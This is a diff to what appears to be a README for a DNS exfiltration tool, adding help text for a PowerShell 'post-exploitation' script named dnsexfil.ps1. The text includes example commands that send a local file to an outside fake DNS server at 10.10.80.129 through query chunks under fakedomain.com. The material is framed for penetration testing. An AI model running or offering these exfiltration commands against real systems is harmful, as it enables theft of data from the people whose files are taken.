@@ -20,6 +20,71 @@ I'm still developing the client side for more than one programming language, to 
 | python2      | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle:      | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle: |
 | Compiled C++ | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle:      | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle: |
 
+### Powershell
+Use the cmdlet `Get-Help` to get execution informations. You can use `Get-Help -detailed` to print a decent overview.
+Here is an instance:
+```
+NAME
+    C:\Users\User\Desktop\dnsexfil.ps1
+
+SYNOPSIS
+    Post-exploitation tool to execute DNS exfiltration to your pentesting machine
+
+SYNTAX
+    C:\Users\User\Desktop\dnsexfil.ps1 [-Server] <String> [-Domain] <String> [-File] <String> [[-Timeout] <Single>]
+    [[-Length] <Int32>] [-Hash] [<CommonParameters>]
+
+
+DESCRIPTION
+    Post-exploitation tool to execute DNS exfiltration to your pentesting machine
+    At leats three parameters are needed:
+    - Specify DNS resolver as Server parameter
+    - Specify filename
+    - Specify the fake or legit domain you want to query
+    The fakeDNS-server must be listening on your machine
+
+PARAMETERS
+    -Server <String>
+        (Required) IP address of the listening DNS resolver
+
+    -Domain <String>
+        (Required) Fake or legit domain for DNS queries. Your fakeDNS-server will answer to both
+
+    -File <String>
+        (Required) Path to the file to exfiltrate through DNS queries
+
+    -Timeout <Single>
+        (Optional) Set a timeout between queries to slow down or speed up exfiltration. Default value is 2s
+
+    -Length <Int32>
+        (Optional) Set the third domain length. Default value is 16
+
+    -Hash [<SwitchParameter>]
+        (Optional) Include hash calculation in exfiltration for integrity purposes
+
+    <CommonParameters>
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer, PipelineVariable, and OutVariable. For more information, see
+        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
+
+    -------------------------- EXAMPLE 1 --------------------------
+    PS C:\>.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt
+
+Use 10.10.80.129 as the fakeDNS-server, and send the file C:\Users\Name\file.txt asking for resolution of
+    [***].fakedomain.com:
+
+    -------------------------- EXAMPLE 2 --------------------------
+    PS C:\>.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt -Length 32 -Timeout 10 -Hash
+
+Queries will be like [32-long-chunk].fakedomain.com and going out every 10 seconds:
+
+    
+
+
+
+
+```
 
 ### Features
 | | |
